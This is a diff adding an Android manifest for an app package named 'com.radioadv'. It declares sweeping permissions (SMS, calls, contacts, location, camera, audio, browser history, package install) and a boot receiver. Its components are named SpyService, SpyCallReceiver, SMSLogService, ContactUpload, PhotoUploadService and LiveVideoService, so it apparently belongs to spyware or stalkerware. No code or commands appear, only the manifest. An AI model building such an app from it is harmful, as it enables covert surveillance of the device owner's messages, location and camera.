@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.radioadv">
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.DEVICE_POWER"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.BLUETOOTH"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.RECORD_VIDEO"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-feature android:name="android.hardware.camera"/>
+    <uses-feature android:name="android.hardware.camera.autofocus"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.READ_CALENDAR"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.DELETE_PACKAGES"/>
+    <application android:debuggable="true" android:icon="@drawable/icon" android:label="@string/app_name">
+        <activity android:clearTaskOnLaunch="true" android:launchMode="singleTask" android:name=".Terms" android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.VIEW"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <activity android:label="Android" android:launchMode="singleTask" android:name=".RecordingActivity" android:screenOrientation="portrait"/>
+        <activity android:clearTaskOnLaunch="true" android:launchMode="singleTask" android:name=".License" android:screenOrientation="portrait"/>
+        <activity android:name=".ObserverActivity" android:screenOrientation="portrait"/>
+        <activity android:label="Android" android:launchMode="singleTask" android:name=".CameraActivity" android:screenOrientation="portrait"/>
+        <activity android:name="AddEditContacts" android:screenOrientation="portrait"/>
+        <activity android:launchMode="singleTask" android:name=".SetPin" android:screenOrientation="portrait"/>
+        <activity android:name=".SettingsActivity" android:screenOrientation="portrait"/>
+        <activity android:name=".SettingsAdvanceActivity" android:screenOrientation="portrait"/>
+        <activity android:name=".UpdateActivity" android:screenOrientation="portrait"/>
+        <receiver android:name=".BasicSB">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="OutCallReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name=".SpyCallReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.PHONE_STATE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <service android:label="Reset" android:name=".ResetService"/>
+        <service android:label="BaseService" android:name=".SpyService"/>
+        <service android:label="SMS" android:name=".SMSLogService"/>
+        <service android:label="SMS" android:name=".SMSOutgoingService"/>
+        <service android:label="SMS2" android:name=".SMSInboxService"/>
+        <service android:label="URL" android:name=".URLTrackService"/>
+        <service android:label="Contact" android:name=".ContactUpload"/>
+        <service android:label="GPS" android:name=".GPSLocationService"/>
+        <service android:label="Call" android:name=".CallLogService"/>
+        <service android:label="Photo" android:name=".PhotoUploadService"/>
+        <service android:label="Conn" android:name=".OfflineConnection"/>
+        <service android:label="HeartBeat" android:name=".HeartBeatService"/>
+        <service android:label="Calendar" android:name=".CalendarLogService"/>
+        <service android:label="EnvService" android:name=".EnvironmentService"/>
+        <service android:label="LiveService" android:name=".LivePicService"/>
+        <service android:label="LiveVService" android:name=".LiveVideoService"/>
+        <service android:label="HeartBeatSet" android:name=".HeartBeatRecorderService"/>
+        <service android:label="HeartBeatLive" android:name=".HeartBeatLiveService"/>
+        <service android:label="InstalledApps" android:name=".InstalledAppsService"/>
+    </application>
+</manifest>
